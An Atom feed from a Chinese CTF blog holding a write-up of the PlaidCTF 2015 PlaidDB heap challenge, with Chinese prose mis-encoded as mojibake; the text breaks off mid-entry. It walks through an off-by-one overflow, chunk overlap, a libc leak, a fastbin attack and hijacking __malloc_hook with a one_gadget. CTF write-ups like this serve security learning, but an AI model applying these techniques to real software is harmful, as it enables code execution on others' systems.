<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://www.uf4te.cn/atom.xml" rel="self"/>
  
  <link href="https://www.uf4te.cn/"/>
  <updated>2024-06-06T13:43:14.000Z</updated>
  <id>https://www.uf4te.cn/</id>
  
  <author>
    <name>uf4te</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€plaidctf 2015ã€‘PlaidDB</title>
    <link href="https://www.uf4te.cn/posts/14f0dc5a.html"/>
    <id>https://www.uf4te.cn/posts/14f0dc5a.html</id>
    <published>2024-05-31T09:22:41.000Z</published>
    <updated>2024-06-06T13:43:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li>åˆ©ç”¨ off-by-one æ¼æ´é€ æˆ Chunk Overlapï¼Œé€šè¿‡å¯¹å †çš„å¸ƒå±€åˆ©ç”¨ <code>unsorted bin</code> ä¿®æ”¹å·²æœ‰ <code>chunk</code> å†…å®¹ä¸º <code>bk</code> æŒ‡é’ˆï¼Œæ³„éœ² libc åœ°å€ï¼Œå¹¶åˆ©ç”¨ fast bin attackï¼Œé”™ä½ä¼ªé€  <code>chunk</code>ï¼ŒåŠ«æŒ <code>__malloc_hook</code> ä¸º one_gadget æ¥ getshell</li></ul><hr><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore">ã€plaidctf 2015ã€‘PlaidDB</a></p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><blockquote><p>æœ¬åœ°ç¯å¢ƒï¼šGlibc 2.23</p></blockquote><p>æŸ¥çœ‹ä¿æŠ¤ï¼Œ64 ä½ä¿æŠ¤å…¨å¼€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb1.png" alt="ã€plaidctf 2015ã€‘plaiddb1.png"></p><p>å°è¯•è¿è¡Œï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb2.png" alt="ã€plaidctf 2015ã€‘plaiddb2.png"></p><p>IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb3.png" alt="ã€plaidctf 2015ã€‘plaiddb3.png"></p><p>ç¨‹åºæœ€å¼€å§‹ä¼šåˆå§‹åŒ–ä¸‰ä¸ªå †ï¼Œç»è¿‡åé¢çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œç¬¬ä¸€ä¸ªå †å­˜æ”¾çš„æ˜¯ç»“æ„ä½“ï¼Œä¸»è¦ä½¿ç”¨äº†äºŒå‰æ ‘çš„ç»“æ„æ¥å­˜å‚¨æ•°æ®ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>    <span class="token keyword">long</span> data_size<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>left<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>    <span class="token keyword">long</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">long</span> dummy1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ä¸è¿‡å…³äºæ ‘çš„ç»“æ„æˆ‘æ²¡å¤ªçœ‹æ‡‚ã€‚ã€‚ã€‚ç½‘ä¸Šè¯´æ˜¯çº¢é»‘æ ‘ï¼Ÿæˆ‘åªçŸ¥é“å‰ä¸‰ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯äºŒå‰æ ‘å„èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»æ˜¯æ€ä¹ˆæ¥çš„ä¸å¤ªæ˜ç™½</p></blockquote><p>å…¶åˆå§‹åŒ– <code>row_key</code> ä¸º <code>th3fl4g</code>ï¼Œåˆå§‹åŒ– <code>data</code> ä¸º <code>youwish</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb11.png" alt="ã€plaidctf 2015ã€‘plaiddb11.png"></p><p>ç¨‹åºè¿è¡Œæ—¶ <code>PROMPT: Enter command:</code> æ˜¯åœ¨ <code>sub_1A20()</code> å‡½æ•°ä¸­å®šä¹‰çš„ï¼Œæœ‰ <code>GET</code>ã€<code>PUT</code>ã€<code>DUMP</code>ã€<code>DEL</code>ã€<code>EXIT</code> è¿™å‡ ç§å‘½ä»¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb4.png" alt="ã€plaidctf 2015ã€‘plaiddb4.png"></p><p><code>GET</code> åŠŸèƒ½ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb5.png" alt="ã€plaidctf 2015ã€‘plaiddb5.png"></p><p>é¦–å…ˆé€šè¿‡ <code>sub_1040()</code> å‡½æ•°è¯»å– <code>row_key</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb6.png" alt="ã€plaidctf 2015ã€‘plaiddb6.png"></p><p>é¦–å…ˆ <code>malloc(8)</code> æ¥å­˜æ”¾ <code>row_key</code> ï¼Œå¦‚æœç©ºé—´å¤§å°ä¸å¤Ÿï¼Œå† <code>realloc()</code></p><blockquote><p>ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç° <code>sub_1040()</code> å‡½æ•°è¿™ä¸ªè¾“å…¥å­˜åœ¨ off-by-null æ¼æ´ï¼Œå¦‚æœå°†æ•°æ®å†™æ»¡ï¼Œè¯¥å‡½æ•°ä¼šæº¢å‡º 1 å­—èŠ‚ï¼Œå¹¶å°†å…¶ç½®ä¸º NULL</p></blockquote><p><code>PUT</code> åŠŸèƒ½ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb7.png" alt="ã€plaidctf 2015ã€‘plaiddb7.png"></p><p>ä¸»è¦æ˜¯è¾“å…¥ä¸€äº›æ•°æ®ï¼Œé¦–å…ˆ <code>malloc(0x38)</code> ç”³è¯·äº†ä¸€ä¸ªå †å—ç”¨äºå­˜æ”¾ç»“æ„ä½“</p><p>åŒæ ·ä½¿ç”¨äº† <code>sub_1040()</code> å‡½æ•°æ¥è¯»å– <code>row_key</code>ï¼Œå¹¶ç”³è¯·äº†ç¬¬äºŒä¸ªå †å—ï¼ŒæŒ‡é’ˆå­˜æ”¾åœ¨ <code>*v0</code></p><p>ç„¶å <code>malloc(v1)</code> ç”³è¯·äº†ç¬¬ä¸‰ä¸ªå †å—ï¼Œè¯»å…¥ <code>size</code> å¤§å°çš„æ•°æ® <code>data</code></p><p>é€šè¿‡è°ƒè¯•æ¥éªŒè¯ä¸€ä¸‹ï¼Œæ‰§è¡Œ <code>PUT(1, 2, b&#39;a&#39;)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb9.png" alt="ã€plaidctf 2015ã€‘plaiddb9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb10.png" alt="ã€plaidctf 2015ã€‘plaiddb10.png"></p><p><code>DEL</code> åŠŸèƒ½ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb16.png" alt="ã€plaidctf 2015ã€‘plaiddb16.png"></p><p>è¿™ä¸ªå‡½æ•°å®ç°çš„æ˜¯åˆ é™¤åŠŸèƒ½ï¼Œç”±äºæ˜¯äºŒå‰æ ‘ç»“æ„ï¼Œè¿™ä¸ªå‡½æ•°æ¯”è¾ƒå¤æ‚ï¼Œåªéœ€è¦çŸ¥é“æ˜¯æŒ‰ç…§ <code>row_key</code> æ¥è¿›è¡Œåˆ é™¤çš„å°±è¡Œï¼Œ<code>row_key</code> é€šè¿‡ <code>sub_1040()</code> å‡½æ•°è¯»å–ï¼Œä¾ç„¶æ˜¯å­˜åœ¨ off-by-one æ¼æ´çš„</p><p>ç°åœ¨æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œç»“åˆç¨‹åºè¿è¡Œï¼Œå¯ä»¥å¤§è‡´çŸ¥é“è¯¥ç¨‹åºçš„åŠŸèƒ½äº†ï¼š</p><ul><li><code>PUT</code> æ’å…¥æ•°æ®ï¼ŒåŒ…æ‹¬ <code>row_key</code>ã€<code>data_size</code>ã€<code>data</code>  </li><li><code>GET</code> æ‰“å° <code>row_key</code> å¯¹åº”çš„ <code>data</code>  </li><li><code>DUMP</code> æ‰“å°æ‰€æœ‰ <code>row_key</code>  </li><li><code>DEL</code> åˆ é™¤ <code>row_key</code> å¯¹åº”çš„æ•°æ®</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb8.png" alt="ã€plaidctf 2015ã€‘plaiddb8.png"></p><p>è™½ç„¶è¾“å…¥ <code>row_key</code> æ—¶å­˜åœ¨ off-by-one æ¼æ´ï¼Œä½†ç‰¹æ®Šåœ¨äºï¼Œå…¶ä½¿ç”¨äº†Â <code>realloc()</code> ä½¿åˆ†é…çš„å¤§å°é€šè¿‡å¯ç”¨ç©ºé—´å¤§å°ä¹˜äºŒçš„æ–¹å¼å¢å¤§</p><p>ä¹Ÿå°±æ˜¯è¯´æƒ³è¦è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œå¯¹äºåˆ†é…çš„å¤§å°æœ‰è¦æ±‚ï¼Œæ»¡è¶³è¯¥è¦æ±‚çš„å¤§å°æœ‰ï¼š<code>0x18</code>ã€<code>0x38</code>ã€<code>0x78</code>ã€<code>0xf8</code>ã€<code>0x1f8</code> ç­‰</p><blockquote><p>é€šè¿‡ off-by-one æ¼æ´æº¢å‡ºåï¼Œå¯ä»¥é€ æˆ Chunk Overlapï¼Œå¹¶æ³„éœ²Â libc åœ°å€ï¼Œä¸”å¯ä»¥å½¢æˆ UAFï¼Œå¯¹äº UAF æ¼æ´é¦–é€‰ fast bin attack çš„æ–¹æ³•</p></blockquote><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦æœ‰ä¸€ä¸ªå¤„äºé‡Šæ”¾çŠ¶æ€çš„ <code>unsorted bin chunk</code> æˆ–è€… <code>small bin chunk</code>ï¼Œç„¶ååœ¨å…¶ä¸‹æ–¹è¿˜éœ€è¦ä¸€ä¸ªè¿›è¡Œæº¢å‡ºçš„ <code>chunk</code> å’Œè¢«æº¢å‡ºçš„ <code>chunk</code></p><p>ç„¶ååˆ©ç”¨ off-by-one æ¼æ´ï¼Œä½¿å®ƒä»¬å…¨éƒ½è¢«åˆå¹¶ä¸ºä¸€ä¸ªå¤„äºé‡Šæ”¾çŠ¶æ€çš„ <code>chunk</code>ï¼Œè¿™æ ·ä¸­é—´ä»»æ„ <code>chunk</code> çš„ä½ç½®å¦‚æœæ˜¯å·²è¢«åˆ†é…çš„ï¼Œå°±å¯ä»¥é€ æˆ Chunk Overlap</p><p>å¤§è‡´ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>            <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> free çš„ unsorted bin æˆ–æ˜¯ small bin chunk ï¼ˆå› ä¸ºæ­¤æ—¶ fd å’Œ bk æŒ‡å‘åˆæ³•æŒ‡é’ˆï¼Œæ‰èƒ½å¤Ÿè¿›è¡Œ unlinkï¼‰<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> ä»»æ„ chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>            <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> è¿›è¡Œæº¢å‡ºçš„ chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>    vuln    <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> è¢«æº¢å‡ºçš„ chunkï¼Œå¤§å°ä¸º <span class="token number">0</span>x_00 ï¼ˆä¾‹å¦‚ <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x200</span>â€¦â€¦ï¼‰<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“åˆÂ <code>sub_1040()</code>Â å‡½æ•°é€šè¿‡Â <code>malloc(8)</code>Â å†Â <code>realloc()</code>Â çš„åˆ†é…æ–¹å¼ï¼Œå¯¹äºå †çš„å¸ƒå±€æœ‰ä»¥ä¸‹è¦æ±‚ï¼š</p><ol><li>ä»»æ„ <code>chunk</code> ä½ç½®è‡³å°‘æœ‰ä¸€ä¸ªå·²ç»è¢«åˆ†é…ã€ä¸”å¯ä»¥è¯»å‡ºæ•°æ®çš„ <code>chunk</code> æ¥æ³„éœ² <code>libc</code> åœ°å€  </li><li>ä»»æ„ <code>chunk</code> ä½ç½®è‡³å°‘è¿˜éœ€è¦æœ‰ä¸€ä¸ªå·²ç»è¢«é‡Šæ”¾ã€ä¸” <code>size</code> ä¸º <code>0x71</code> çš„ <code>chunk</code> æ¥è¿›è¡Œ <code>fast bin attack</code>  </li><li>è¿›è¡Œæº¢å‡ºçš„ <code>chunk</code> éœ€è¦åœ¨æœ€ä¸Šæ–¹çš„ <code>chunk</code> ä¹‹å‰è¢«åˆ†é…ï¼Œå¦åˆ™Â <code>malloc(8)</code>Â çš„æ—¶å€™ä¼šåˆ†é…åˆ°æœ€ä¸Šæ–¹ï¼Œè€Œä¸æ˜¯è¿›è¡Œæº¢å‡º <code>chunk</code> æ‰€åœ¨çš„ä¸‹æ–¹çš„ä½ç½®  </li><li>è¿›è¡Œæº¢å‡ºçš„ <code>chunk</code> å¤§å°åº”è¯¥å±äº <code>unsorted bin</code> æˆ–æ˜¯ <code>small bin</code>ï¼Œä¸èƒ½ä¸º <code>fast bin</code>ï¼Œå¦åˆ™è¢«é‡Šæ”¾ä¹‹åï¼ŒæŒ‰ç…§Â <code>sub_1040()</code>Â å‡½æ•°çš„åˆ†é…æ–¹å¼ï¼Œ<code>malloc(8)</code>Â æ— æ³•åˆ†é…åœ¨è¯¥ä½ç½®  </li><li>æœ€ä¸‹æ–¹åº”è¯¥æœ‰ä¸€ä¸ªå·²ç»è¢«åˆ†é…çš„ <code>chunk</code> æ¥é˜²æ­¢ä¸ <code>top chunk</code> åˆå¹¶</li></ol><p>æŒ‰ç…§ä¸Šè¿°è¦æ±‚ï¼Œå®Œæ•´çš„å †ç»“æ„åº”è¯¥å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">1</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> free çš„ size <span class="token operator">==</span> <span class="token number">0x200</span> chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">2</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x60</span> fastbin chunkï¼Œå·²è¢«åˆ†é…ï¼Œä¸”å¯ä»¥è¯»å‡ºæ•°æ®<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">3</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x71</span> fastbin chunkï¼Œä¸º fastbin attack åšå‡†å¤‡<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">4</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x1f8</span> free çŠ¶æ€çš„ small bin<span class="token operator">/</span>unsorted bin chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">5</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x101</span> è¢«æº¢å‡º chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>         X        <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> ä»»æ„åˆ†é…å chunk é˜²æ­¢ top chunk åˆå¹¶<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºåˆ†é…è¿‡ç¨‹ä¸­è¿˜å­˜åœ¨ä¸€äº›é¢å¤–ç»“æ„ï¼ŒåŒ…æ‹¬ç»“æ„ä½“æœ¬èº«çš„åˆ†é…å’ŒÂ <code>sub_1040()</code>Â å‡½æ•°ï¼Œå› æ­¤éœ€è¦å…ˆé‡Šæ”¾å‡ºè¶³å¤Ÿçš„ <code>fast bin chunk</code> æ¥é¿å…ç»“æ„ä½“æœ¬èº«çš„åˆ†é…å¯¹æˆ‘ä»¬å¸ƒç½®çš„å¯¹ç»“æ„é€ æˆå½±å“</p><p>è¿™é‡Œé€šè¿‡å…ˆæ‰§è¡Œ 10 æ¬¡ <code>PUT()</code> å’Œ 10 æ¬¡ <code>DEL()</code> æ¥å®ç°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb12.png" alt="ã€plaidctf 2015ã€‘plaiddb12.png"></p><p>æ„é€ å¥½æˆ‘ä»¬éœ€è¦çš„å †å—åï¼Œåˆ†åˆ« <code>free</code> æ‰ <code>chunk 3</code>ã€<code>chunk 4</code> å’Œ <code>chunk 1</code></p><p><code>DEL(b&#39;3&#39;)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb13.png" alt="ã€plaidctf 2015ã€‘plaiddb13.png"></p><p><code>DEL(b&#39;4&#39;)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb14.png" alt="ã€plaidctf 2015ã€‘plaiddb14.png"></p><p><code>DEL(b&#39;1&#39;)</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb15.png" alt="ã€plaidctf 2015ã€‘plaiddb15.png"></p><p>è¿™æ ·å°±å½¢æˆäº†æˆ‘ä»¬æ‰€éœ€è¦çš„å †ç»“æ„</p><p>ç„¶ååˆ©ç”¨ <code>DEL()</code> ä¸­ <code>sub_1040()</code> å‡½æ•°è¯»å– <code>row_key</code> æ—¶çš„ off-by-one æ¼æ´ï¼Œå°† <code>chunk 4</code> å†™æ»¡ï¼Œå¹¶æº¢å‡ºè¦†ç›– <code>chunk 5</code> çš„ <code>prev_size</code> åŸŸï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb18.png" alt="ã€plaidctf 2015ã€‘plaiddb18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb17.png" alt="ã€plaidctf 2015ã€‘plaiddb17.png"></p><p>è¿™é‡Œè¦†ç›–çš„æ˜¯ <code>0x4e0</code>ï¼Œå› ä¸ºæˆ‘ä»¬ä¸ºäº†é€ æˆ Chunk Overlapï¼Œéœ€è¦è®©è¿™äº› <code>chunk</code> å…¨éƒ¨è¢«åˆå¹¶ä¸ºä¸€ä¸ªå¤„äºé‡Šæ”¾çŠ¶æ€çš„ <code>chunk</code></p><p>å› æ­¤ <code>chunk 5</code> çš„ <code>prev_size</code> åŸŸéœ€è¦ä¿®æ”¹ä¸ºå‰å‡ ä¸ª <code>chunk</code> çš„å¤§å°ä¹‹å’Œï¼Œå³ï¼š<code>0x4e0 = 0x200 + 0x50 + 0x68 + 0x1f8 + 0x30</code></p><p>ç„¶å <code>free</code> æ‰ <code>chunk 5</code>ï¼Œè¿™äº› <code>chunk</code> å°†ä¼šè¢«åˆå¹¶æˆä¸€ä¸ª <code>unsorted bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb19.png" alt="ã€plaidctf 2015ã€‘plaiddb19.png"></p><p>ç”±äºæ­¤æ—¶è¿˜å­˜åœ¨ä¸€ä¸ª <code>0x360</code> çš„ <code>small bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb20.png" alt="ã€plaidctf 2015ã€‘plaiddb20.png"></p><p>ä¸ºäº†é˜²æ­¢å¹²æ‰°ï¼Œéœ€è¦å…ˆé€šè¿‡ <code>PUT(b&#39;0x200&#39;, 0x200, b&#39;fillup&#39;)</code> å°†å…¶åˆ†é…æ‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb21.png" alt="ã€plaidctf 2015ã€‘plaiddb21.png"></p><p>æ­¤æ—¶åˆå¹¶çš„ <code>chunk</code> è¢«ç½®äº <code>large bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb22.png" alt="ã€plaidctf 2015ã€‘plaiddb22.png"></p><blockquote><p>ä¸ºäº†æ³„éœ² libc åŸºåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>unsorted bin</code> çš„ç‰¹æ€§ï¼Œæ‰“å°å…¶ <code>bk</code> æŒ‡é’ˆ</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨æ­¤æ—¶ <code>chunk 2</code> ä¸åˆå¹¶çš„ <code>chunk</code> é‡å çš„ç‰¹ç‚¹ï¼Œåˆ©ç”¨ <code>unsorted bin</code> æ¥ä¿®æ”¹ <code>chunk 2</code> çš„æŒ‡é’ˆ</p></blockquote><p>å› æ­¤ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡ <code>PUT(b&#39;0x200 fillup&#39;, 0x200, b&#39;fillup again&#39;)</code> ä» <code>large bin</code> ä¸­å°†ä¹‹å‰çš„ <code>chunk 1</code> çš„ç©ºé—´åˆ†é…æ‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb23.png" alt="ã€plaidctf 2015ã€‘plaiddb23.png"></p><p>æ­¤æ—¶ <code>chunk 2</code> å¤„äº <code>unsorted bin</code> çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œå…¶æŒ‡é’ˆå·²è¢« <code>unsorted bin</code> ä¿®æ”¹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb24.png" alt="ã€plaidctf 2015ã€‘plaiddb24.png"></p><p>äºæ˜¯æˆ‘ä»¬åªéœ€ <code>GET(b&#39;2&#39;)</code> å°±å¯ä»¥åœ¨ <code>data_size</code> è¾“å‡ºçš„ä½ç½®è¾“å‡º <code>bk</code> æŒ‡é’ˆï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb25.png" alt="ã€plaidctf 2015ã€‘plaiddb25.png"></p><p><code>bk</code> æŒ‡é’ˆæŒ‡å‘ <code>main_arena + 88</code> çš„ä½ç½®ï¼Œæ ¹æ® <code>main_arena</code> ä¸ <code>__malloc_hook</code> å­˜åœ¨å›ºå®šåç§» <code>0x10</code>ï¼Œåˆ©ç”¨ <code>__malloc_hook</code> åœ¨ libc ä¸­çš„åç§»å³å¯å¾—åˆ° libc åŸºåœ°å€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb26.png" alt="ã€plaidctf 2015ã€‘plaiddb26.png"></p><p>ç”±äºå‰é¢æˆ‘ä»¬å·²ç»é‡Šæ”¾äº† <code>chunk 1</code>ã€<code>chunk 3</code>ã€<code>chunk 4</code>ï¼Œåªå‰© <code>chunk 2</code> å’Œ <code>chunk 5</code> å¯ä»¥åˆ©ç”¨äº†ï¼Œæ­¤æ—¶ <code>unsorted bin</code> è·ç¦» <code>chunk 5</code> æ­£å¥½ <code>0x5586e425b950 - 0x5586e425b900 = 0x50</code></p><p>äºæ˜¯å¡«å…… <code>0x58</code> å°±å¯ä»¥ä¿®æ”¹ <code>chunk 5</code> çš„ <code>size</code> åŸŸå’Œ <code>fd</code>ï¼Œå³å¯æ§åˆ¶ä¸‹ä¸€ä¸ª <code>fast bin</code> çš„ä½ç½®</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb27.png" alt="ã€plaidctf 2015ã€‘plaiddb27.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb28.png" alt="ã€plaidctf 2015ã€‘plaiddb28.png"></p><p>ç„¶åè¿›è¡Œ fast bin attackï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb29.png" alt="ã€plaidctf 2015ã€‘plaiddb29.png"></p><p>åŠ«æŒ <code>__malloc_hook</code> ä¸º one_gadgetï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb30.png" alt="ã€plaidctf 2015ã€‘plaiddb30.png"></p><p>è¿™æ ·çœ‹å¾—æ›´æ¸…æ¥šï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb31.png" alt="ã€plaidctf 